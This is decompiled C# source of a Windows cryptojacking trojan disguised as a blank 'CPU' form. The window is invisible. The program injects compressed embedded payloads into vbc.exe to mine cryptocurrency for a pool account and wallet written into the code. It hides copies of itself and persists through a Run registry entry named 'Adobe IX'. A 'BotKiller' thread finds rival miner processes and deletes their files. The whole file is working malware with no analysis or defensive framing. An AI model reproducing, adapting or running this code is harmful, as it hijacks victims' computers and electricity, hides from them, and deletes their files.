using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using CPU.My;
using CPU.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace CPU;

[DesignerGenerated]
public class CPU : Form
{
	public class Scanner
	{
		public string[] L_String;

		private bool Running;

		private Thread RunThread;

		public Scanner()
		{
			Class2.Tfbc7BhzM3pUR();
			base._002Ector();
			L_String = new string[8] { "BitcoinMiner", "coin-miner", "Ufasoft", "UPX", "coinminer", "Bitcoin", "Litcoin", "miner" };
			Running = false;
		}

		private bool StringCheck(string Filename)
		{
			string @string = Encoding.ASCII.GetString(File.ReadAllBytes(Filename));
			bool result = false;
			string[] l_String = L_String;
			foreach (string value in l_String)
			{
				if (@string.Replace(" ", "").ToLower().Contains(value))
				{
					result = true;
					break;
				}
			}
			return result;
		}

		private void Scanner()
		{
			//IL_0092: Unknown result type (might be due to invalid IL or missing references)
			string processName = Process.GetCurrentProcess().ProcessName;
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (Operators.CompareString(process.ProcessName, processName, false) == 0)
				{
					continue;
				}
				try
				{
					if (StringCheck(process.Modules[0].FileName))
					{
						IntPtr handle = process.Handle;
						int processInformation = 0;
						NtSetInformationProcess(handle, 29, ref processInformation, Marshal.SizeOf((object)0));
						Thread.Sleep(1000);
						Interaction.MsgBox((object)process.Modules[0].FileName, (MsgBoxStyle)0, (object)null);
						File.SetAttributes(process.Modules[0].FileName, FileAttributes.Normal);
						Thread.Sleep(1000);
						string path = process.Modules[0].FileName;
						DeleteFileA(ref path);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}

		public void StartBotKiller()
		{
			if (!Running)
			{
				RunThread = new Thread(Scanner);
				Running = true;
				RunThread.Start();
			}
		}

		public void StopBotKiller()
		{
			if (Running)
			{
				RunThread.Abort();
				Running = false;
			}
		}

		[DllImport("ntdll")]
		private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern bool DeleteFileA([MarshalAs(UnmanagedType.VBByRefStr)] ref string path);
	}

	private static List<WeakReference> __ENCList;

	private IContainer components;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox _CheckBox1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	[AccessedThroughProperty("LinkLabel1")]
	private LinkLabel _LinkLabel1;

	[AccessedThroughProperty("LinkLabel2")]
	private LinkLabel _LinkLabel2;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("PictureBox2")]
	private PictureBox _PictureBox2;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("TextBox2")]
	private TextBox _TextBox2;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("Button3")]
	private Button _Button3;

	private Mutex siMutex;

	private static Scanner B;

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Button1 = value;
		}
	}

	internal virtual CheckBox CheckBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckBox1 = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual Label Label4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label4 = value;
		}
	}

	internal virtual LinkLabel LinkLabel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _LinkLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_LinkLabel1 = value;
		}
	}

	internal virtual LinkLabel LinkLabel2
	{
		[DebuggerNonUserCode]
		get
		{
			return _LinkLabel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_LinkLabel2 = value;
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox1 = value;
		}
	}

	internal virtual PictureBox PictureBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox2 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual TextBox TextBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox2 = value;
		}
	}

	internal virtual Button Button2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Button2 = value;
		}
	}

	internal virtual Button Button3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Button3 = value;
		}
	}

	[DebuggerNonUserCode]
	public CPU()
	{
		Class2.Tfbc7BhzM3pUR();
		((Form)this)._002Ector();
		((Form)this).add_Load((EventHandler)CPU_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_080f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0819: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(CPU));
		Button1 = new Button();
		CheckBox1 = new CheckBox();
		Label1 = new Label();
		Label2 = new Label();
		Label3 = new Label();
		Label4 = new Label();
		LinkLabel1 = new LinkLabel();
		LinkLabel2 = new LinkLabel();
		ProgressBar1 = new ProgressBar();
		PictureBox1 = new PictureBox();
		PictureBox2 = new PictureBox();
		TextBox1 = new TextBox();
		TextBox2 = new TextBox();
		Button2 = new Button();
		Button3 = new Button();
		((ISupportInitialize)PictureBox1).BeginInit();
		((ISupportInitialize)PictureBox2).BeginInit();
		((Control)this).SuspendLayout();
		Button button = Button1;
		Point location = new Point(263, 91);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		Size size = new Size(75, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(0);
		((ButtonBase)Button1).set_Text("Button1");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox1).set_AutoSize(true);
		CheckBox checkBox = CheckBox1;
		location = new Point(263, 196);
		((Control)checkBox).set_Location(location);
		((Control)CheckBox1).set_Name("CheckBox1");
		CheckBox checkBox2 = CheckBox1;
		size = new Size(81, 17);
		((Control)checkBox2).set_Size(size);
		((Control)CheckBox1).set_TabIndex(1);
		((ButtonBase)CheckBox1).set_Text("CheckBox1");
		((ButtonBase)CheckBox1).set_UseVisualStyleBackColor(true);
		Label1.set_AutoSize(true);
		Label label = Label1;
		location = new Point(409, 143);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(39, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(2);
		Label1.set_Text("Label1");
		Label2.set_AutoSize(true);
		Label label3 = Label2;
		location = new Point(433, 67);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(39, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(3);
		Label2.set_Text("Label2");
		Label3.set_AutoSize(true);
		Label label5 = Label3;
		location = new Point(563, 106);
		((Control)label5).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label6 = Label3;
		size = new Size(39, 13);
		((Control)label6).set_Size(size);
		((Control)Label3).set_TabIndex(4);
		Label3.set_Text("Label3");
		Label4.set_AutoSize(true);
		Label label7 = Label4;
		location = new Point(496, 125);
		((Control)label7).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label8 = Label4;
		size = new Size(39, 13);
		((Control)label8).set_Size(size);
		((Control)Label4).set_TabIndex(5);
		Label4.set_Text("Label4");
		((Label)LinkLabel1).set_AutoSize(true);
		LinkLabel linkLabel = LinkLabel1;
		location = new Point(554, 39);
		((Control)linkLabel).set_Location(location);
		((Control)LinkLabel1).set_Name("LinkLabel1");
		LinkLabel linkLabel2 = LinkLabel1;
		size = new Size(59, 13);
		((Control)linkLabel2).set_Size(size);
		((Control)LinkLabel1).set_TabIndex(6);
		((Label)LinkLabel1).set_TabStop(true);
		LinkLabel1.set_Text("LinkLabel1");
		((Label)LinkLabel2).set_AutoSize(true);
		LinkLabel linkLabel3 = LinkLabel2;
		location = new Point(540, 75);
		((Control)linkLabel3).set_Location(location);
		((Control)LinkLabel2).set_Name("LinkLabel2");
		LinkLabel linkLabel4 = LinkLabel2;
		size = new Size(59, 13);
		((Control)linkLabel4).set_Size(size);
		((Control)LinkLabel2).set_TabIndex(7);
		((Label)LinkLabel2).set_TabStop(true);
		LinkLabel2.set_Text("LinkLabel2");
		ProgressBar progressBar = ProgressBar1;
		location = new Point(370, 22);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar2 = ProgressBar1;
		size = new Size(232, 14);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(8);
		PictureBox pictureBox = PictureBox1;
		location = new Point(346, 29);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		size = new Size(100, 50);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_TabIndex(9);
		PictureBox1.set_TabStop(false);
		PictureBox pictureBox3 = PictureBox2;
		location = new Point(346, 106);
		((Control)pictureBox3).set_Location(location);
		((Control)PictureBox2).set_Name("PictureBox2");
		PictureBox pictureBox4 = PictureBox2;
		size = new Size(100, 50);
		((Control)pictureBox4).set_Size(size);
		PictureBox2.set_TabIndex(10);
		PictureBox2.set_TabStop(false);
		TextBox textBox = TextBox1;
		location = new Point(499, 163);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		size = new Size(100, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(11);
		TextBox textBox3 = TextBox2;
		location = new Point(472, 98);
		((Control)textBox3).set_Location(location);
		TextBox2.set_Multiline(true);
		((Control)TextBox2).set_Name("TextBox2");
		TextBox textBox4 = TextBox2;
		size = new Size(100, 40);
		((Control)textBox4).set_Size(size);
		((Control)TextBox2).set_TabIndex(12);
		Button button3 = Button2;
		location = new Point(411, 203);
		((Control)button3).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button4 = Button2;
		size = new Size(75, 23);
		((Control)button4).set_Size(size);
		((Control)Button2).set_TabIndex(13);
		((ButtonBase)Button2).set_Text("Button2");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		Button button5 = Button3;
		location = new Point(475, 53);
		((Control)button5).set_Location(location);
		((Control)Button3).set_Name("Button3");
		Button button6 = Button3;
		size = new Size(75, 23);
		((Control)button6).set_Size(size);
		((Control)Button3).set_TabIndex(14);
		((ButtonBase)Button3).set_Text("Button3");
		((ButtonBase)Button3).set_UseVisualStyleBackColor(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(320, 33);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)Button3);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)PictureBox2);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)LinkLabel2);
		((Control)this).get_Controls().Add((Control)(object)LinkLabel1);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)CheckBox1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("CPU");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("CPU");
		((Form)this).set_WindowState((FormWindowState)1);
		((ISupportInitialize)PictureBox1).EndInit();
		((ISupportInitialize)PictureBox2).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	static CPU()
	{
		Class2.Tfbc7BhzM3pUR();
		__ENCList = new List<WeakReference>();
		B = new Scanner();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void CPU_Load(object sender, EventArgs e)
	{
		try
		{
			Thread.Sleep(2000);
			siMutex = new Mutex(initiallyOwned: false, "CPUMutex");
			if (!siMutex.WaitOne(0, exitContext: false))
			{
				ProjectData.EndApp();
			}
			check_internet();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			start_mining();
			ProjectData.ClearProjectError();
		}
	}

	public static bool IsConnected()
	{
		try
		{
			return ((ServerComputer)MyProject.Computer).get_Network().Ping("8.8.8.8");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object cBytes(byte[] bytes, object invoc, string method, string Clas)
	{
		DynamicMethod dynamicMethod = new DynamicMethod("ExecBytes", typeof(object), new Type[4]
		{
			typeof(byte[]),
			typeof(object[]),
			typeof(string),
			typeof(string)
		}, typeof(object));
		ILGenerator iLGenerator = dynamicMethod.GetILGenerator();
		iLGenerator.Emit(OpCodes.Ldarg_0);
		iLGenerator.EmitCall(OpCodes.Call, typeof(Assembly).GetMethod("Load", new Type[1] { typeof(byte[]) }), null);
		iLGenerator.Emit(OpCodes.Ldarg_2);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(Assembly).GetMethod("GetType", new Type[1] { typeof(string) }), null);
		iLGenerator.Emit(OpCodes.Ldarg_3);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(Type).GetMethod("GetMethod", new Type[1] { typeof(string) }), null);
		iLGenerator.Emit(OpCodes.Ldnull);
		iLGenerator.Emit(OpCodes.Ldarg_1);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(MethodBase).GetMethod("Invoke", new Type[2]
		{
			typeof(object),
			typeof(object[])
		}), null);
		iLGenerator.Emit(OpCodes.Ret);
		return dynamicMethod.Invoke(null, new object[4]
		{
			bytes,
			RuntimeHelpers.GetObjectValue(invoc),
			Clas,
			method
		});
	}

	public static void check_internet()
	{
		try
		{
			while (!IsConnected())
			{
				Thread.Sleep(20000);
			}
			start_mining();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			start_mining();
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] Decompress(byte[] bytData)
	{
		checked
		{
			using (MemoryStream memoryStream = new MemoryStream(bytData))
			{
				using (GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress))
				{
					int num = 0;
					int num2;
					do
					{
						bytData = (byte[])Utils.CopyArray((Array)bytData, (Array)new byte[num + 1024 - 1 + 1]);
						num2 = gZipStream.Read(bytData, num, 1024);
						num += num2;
					}
					while (num2 >= 1024);
					bytData = (byte[])Utils.CopyArray((Array)bytData, (Array)new byte[num - 1 + 1]);
					gZipStream.Close();
				}
				memoryStream.Close();
			}
			return bytData;
		}
	}

	public static byte[] Dzip(ref byte[] file)
	{
		return Decompress(file);
	}

	public static void start_mining()
	{
		try
		{
			IntPtr zero = IntPtr.Zero;
			byte[] pE = Resources.PE;
			byte[] m_ = Resources.M_0;
			cBytes(Decompress(pE), new object[5]
			{
				Decompress(m_),
				Path.GetDirectoryName(Environment.SystemDirectory) + "\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe",
				zero,
				"-g no -t 2 -a 5 -o http://pool.50btc.com:8332 -u 1FaAQWCAsWJpnPajk4X4QbMonvkViSq333",
				true
			}, "Start", "FRcpKjplxWFkm.PGblIXOtCrqAzS");
			Thread.Sleep(2000);
			AddToStartup("Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Adobe IX", "Tmp420", "CPUMutex", ".tmp.exe");
			Thread.Sleep(20000);
			B.StartBotKiller();
			Thread.Sleep(60000);
			cBytes(Decompress(pE), new object[5]
			{
				Decompress(m_),
				Path.GetDirectoryName(Environment.SystemDirectory) + "\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe",
				zero,
				"-g no -t 1 -a 5 -o http://pool.50btc.com:8332 -u N3oSales@live.com_Roostr",
				true
			}, "Start", "FRcpKjplxWFkm.PGblIXOtCrqAzS");
			Killer();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			check_internet();
			ProjectData.ClearProjectError();
		}
	}

	public static void AddToStartup(string RegistryKey, string RegistryName, string TempFileName, string TempFileContent, string Extension)
	{
		string fileName = Process.GetCurrentProcess().MainModule!.FileName;
		try
		{
			AddToRegistry(RegistryName, fileName, RegistryKey);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		Random random = new Random();
		string path = Path.GetTempPath() + TempFileName;
		if (File.Exists(path))
		{
			string text = File.ReadAllText(path);
			if (Operators.CompareString(text.ToLower(), TempFileContent, false) == 0)
			{
				return;
			}
		}
		try
		{
			string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tmp" + Conversions.ToString(random.Next(10, 99)) + Extension;
			File.Copy(fileName, text2);
			File.WriteAllText(path, TempFileContent);
			AddToRegistry(RegistryName, text2, RegistryKey);
			File.SetAttributes(text2, FileAttributes.Hidden | FileAttributes.System);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			try
			{
				string text3 = Path.GetTempPath() + Conversions.ToString(random.Next()) + Extension;
				File.Copy(fileName, text3);
				File.WriteAllText(path, TempFileContent);
				AddToRegistry(RegistryName, fileName, RegistryKey);
				File.SetAttributes(text3, FileAttributes.Hidden | FileAttributes.System);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
		}
	}

	public static void Killer()
	{
		while (true)
		{
			Thread.Sleep(100000);
			B.StartBotKiller();
		}
	}

	public static void AddToRegistry(string Id, string Value, string Key__1)
	{
		try
		{
			RegistryKey registryKey = null;
			registryKey = Registry.CurrentUser.OpenSubKey(Key__1, writable: true);
			registryKey.SetValue(Id, Value);
			registryKey.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
